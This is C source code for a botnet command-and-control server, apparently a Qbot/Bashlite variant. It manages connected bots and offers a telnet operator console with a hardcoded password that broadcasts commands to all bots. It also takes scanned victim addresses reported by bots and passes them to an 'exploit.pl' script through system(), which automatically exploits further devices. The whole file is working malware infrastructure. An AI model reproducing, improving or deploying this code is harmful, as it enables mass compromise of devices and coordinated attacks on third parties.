#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <sys/queue.h>
#include <poll.h>
 
#define MY_MGM_PASS "1ffqfwq"
#define MY_MGM_PORT 666
 
#define MAXFDS 100000
 
STAILQ_HEAD(QueueHead,QueueEntry);
 
struct Queue {
        pthread_mutex_t mutex;
        pthread_cond_t cv;
        pthread_cond_t enq_wait_cv;
        int enq_waiters;
        int length;
        int limit;
        int pool_length;
        int pool_limit;
        struct QueueHead queue;
        struct QueueHead pool;
};
 
struct QueueEntry {
        void *item;
        STAILQ_ENTRY(QueueEntry) entries;
};
 
struct Queue* queue_init();
int queue_destroy(struct Queue *q);
int queue_empty(struct Queue *q);
int queue_full(struct Queue *q);
int queue_enq(struct Queue *q, void *item);
int queue_length(struct Queue *q);
int queue_pool_length(struct Queue *q);
void queue_limit(struct Queue *q, int limit);
void queue_pool_limit(struct Queue *q, int limit);
void *queue_deq(struct Queue *q);
 
# define AZ(foo)  do { if ((foo) != 0) abort(); } while (0)
 
struct Queue *queue_init()
{
        struct Queue *q;
        q = (struct Queue *)malloc(sizeof(struct Queue));
 
        if (q)
        {
                q->length = 0;
                q->limit = -1;
                q->pool_length = 0;
                q->pool_limit = -1;
                q->enq_waiters = 0;
                AZ(pthread_mutex_init(&q->mutex, NULL));
                AZ(pthread_cond_init(&q->cv, NULL));
                AZ(pthread_cond_init(&q->enq_wait_cv, NULL));
                STAILQ_INIT(&q->queue);
                STAILQ_INIT(&q->pool);
        }
        return(q);
}
 
int queue_destroy(struct Queue *q)
{
        struct QueueEntry *qi;
 
        while (!STAILQ_EMPTY(&q->pool))
        {
                qi = STAILQ_FIRST(&q->pool);
                STAILQ_REMOVE_HEAD(&q->pool, entries);
                q->pool_length--;
                free(qi);
        }
        AZ(pthread_cond_destroy(&q->cv));
        AZ(pthread_mutex_destroy(&q->mutex));
        free(q);
        return 1;
}
 
int queue_empty(struct Queue *q)
{
        return(STAILQ_EMPTY(&q->queue));
}
 
int queue_full(struct Queue *q)
{
        return (q->limit > 0 && q->length >= q->limit);
}
 
int queue_enq(struct Queue *q, void *item)
{
        struct QueueEntry *qi;
 
        AZ(pthread_mutex_lock(&q->mutex));
        if (queue_full(q))
        {
                q->enq_waiters++;
                while (queue_full(q))
                        AZ(pthread_cond_wait(&q->enq_wait_cv, &q->mutex));
                q->enq_waiters--;
        }
 
        if (!STAILQ_EMPTY(&q->pool))
        {
                qi = STAILQ_FIRST(&q->pool);
                STAILQ_REMOVE_HEAD(&q->pool, entries);
                q->pool_length--;
        }
        else
        {
                if (!(qi = (struct QueueEntry *)malloc(sizeof(struct QueueEntry))))
                        abort(); // could return 0/-1, but meh.
        }
 
        qi->item = item;
 
        STAILQ_INSERT_TAIL(&q->queue, qi, entries);
        q->length++;
        AZ(pthread_cond_signal(&q->cv));
        AZ(pthread_mutex_unlock(&q->mutex));
        return 1;
}
 
void *queue_deq(struct Queue *q)
{
        void *ret = NULL;
        struct QueueEntry *qi;
 
        AZ(pthread_mutex_lock(&q->mutex));
        while (STAILQ_EMPTY(&q->queue))
                AZ(pthread_cond_wait(&q->cv, &q->mutex));
 
        qi = STAILQ_FIRST(&q->queue);
        STAILQ_REMOVE_HEAD(&q->queue, entries);
        q->length--;
        ret = qi->item;
        if (q->pool_limit < 0 || q->pool_length < q->pool_limit)
        {
                STAILQ_INSERT_TAIL(&q->pool, qi, entries);
                q->pool_length++;
        }
        else free(qi);
 
        if (q->enq_waiters > 0)
                AZ(pthread_cond_signal(&q->enq_wait_cv));
        AZ(pthread_mutex_unlock(&q->mutex));
        return ret;
}
 
int queue_length(struct Queue *q)
{
        return(q->length);
}
 
int queue_pool_length(struct Queue *q)
{
        return(q->pool_length);
}
 
void queue_limit(struct Queue *q, int limit)
{
        q->limit = limit;
}
 
void queue_pool_limit(struct Queue *q, int limit)
{
        q->pool_limit = limit;
}
 
void *p_exploit_le_garrison();
 
struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
struct Queue *theQueue;
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags);
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}
static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;     /* Return IPv4 and IPv6 choices */
        hints.ai_socktype = SOCK_STREAM; /* We want a TCP socket */
        hints.ai_flags = AI_PASSIVE;     /* All interfaces */
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[33m", 5, MSG_NOSIGNAL);
                        send(i, timestamp, strlen(timestamp), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL);
                }
                printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[31m> \x1b[0m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
 
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
                int i = 0;
                int s;
                FILE *fsx = fopen("not_processed.txt", "a+");
                pthread_t sup;
                for(i = 0; i < 50; i++)
                        pthread_create(&sup, NULL, &p_exploit_le_garrison, NULL);
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
 
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
 
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
 
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
 
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup)
                                        {
                                                printf("dup client\n");
                                                if(send(infd, "!* LOLNOGTFO\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                if(send(infd, "DUP\n", 4, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        //send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0)
                                                {
                                                        if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
                                                        continue;
                                                }
                                                if(strstr(buf, "BUILD ") == buf)
                                                {
                                                        char *build = strstr(buf, "BUILD ") + 6;
                                                        if(strlen(build) > 6) { printf("build bigger then 6\n"); done = 1; break; }
                                                        memset(client->build, 0, 7);
                                                        strcpy(client->build, build);
                                                        continue;
                                                }
                                                if(strstr(buf, "REPORT ") == buf)
                                                {
                                                        char *line = strstr(buf, "REPORT ") + 7;
                                                        fprintf(fileFD, "%s\n", line);
                                                        fflush(fileFD);
                                                                                                           //TODO: automatically exploit that particular IP after scanning for dir and uploading correct arch stuffs.
                                                                                                           if(queue_length(&theQueue) < 10000)
                                                                                                           {
                                                                                                           queue_enq(theQueue, (void *)strdup(line));
                                                                                                           printf("Queued for pl.\n");
                                                                                                           }
                                                                                                           else
                                                                                                           {
                                                                                                           fprintf(fsx, "%s\n", line);
                                                                                                           fflush(fsx);
                                                                                                           }
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        //should really add some checking or something but meh
                                                        continue;
                                                }
                                                printf("buf: \"%s\"\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
void *p_exploit_le_garrison()
{
        void *item = NULL;
        while((item = queue_deq(theQueue)))
        {
                printf("Started le thread\n");
                char nargs[512];
                memset(nargs, 0, 512);
                strcat(nargs, "perl exploit.pl ");
                strcat(nargs, (char*)item);
                printf("%s\n", nargs);
                system(nargs);
                printf("Ending le thread\n");
                free(item);
        }
}
 
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
 
void *titleWriter(void *sock)
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0;Bots connected: %d | Clients connected: %d%c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 
                sleep(2);
        }
}
 
 
void *telnetWorker(void *sock)
{
        int thefd = (int)sock;
        managesConnected++;
        pthread_t title;
        char buf[2048];
        memset(buf, 0, sizeof buf);
 
        if(send(thefd, "password: ", 10, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, MY_MGM_PASS) != 0) goto end;
        memset(buf, 0, 2048);
        if(send(thefd, "\033[1A", 4, MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
 
        if(send(thefd, "\x1b[31m*****************************************\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*        WELCOME TO THE BALL PIT [VYPOR]     *\r\n", 43, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*     Now with \x1b[32mrefrigerator\x1b[31m support     *\r\n", 53, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*****************************************\r\n\r\n> \x1b[0m", 51, MSG_NOSIGNAL) == -1) goto end;
        managements[thefd].connected = 1;
 
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
                trim(buf);
                if(send(thefd, "\x1b[31m> \x1b[0m", 11, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("management: \"%s\"\n", buf);
                broadcast(buf, thefd);
                memset(buf, 0, 2048);
        }
 
        end:
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
 
void *telnetListener(void *useless)
{
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(MY_MGM_PORT);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[])
{
        signal(SIGPIPE, SIG_IGN);
                theQueue = queue_init();
        int s, threads;
        struct epoll_event event;
 
        if (argc != 3)
        {
                fprintf (stderr, "Usage: %s [port] [threads]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
        fileFD = fopen("output.txt", "a+");
        threads = atoi(argv[2]);
 
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
 
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
 
        s = listen (listenFD, SOMAXCONN);
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
 
        epollFD = epoll_create1 (0);
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
 
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
 
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL);
        }
 
        pthread_create(&thread[0], NULL, &telnetListener, (void *)NULL);
 
        while(1)
        {
                broadcast("PING", -1);
 
                sleep(60);
        }
 
        close (listenFD);
 
        return EXIT_SUCCESS;
}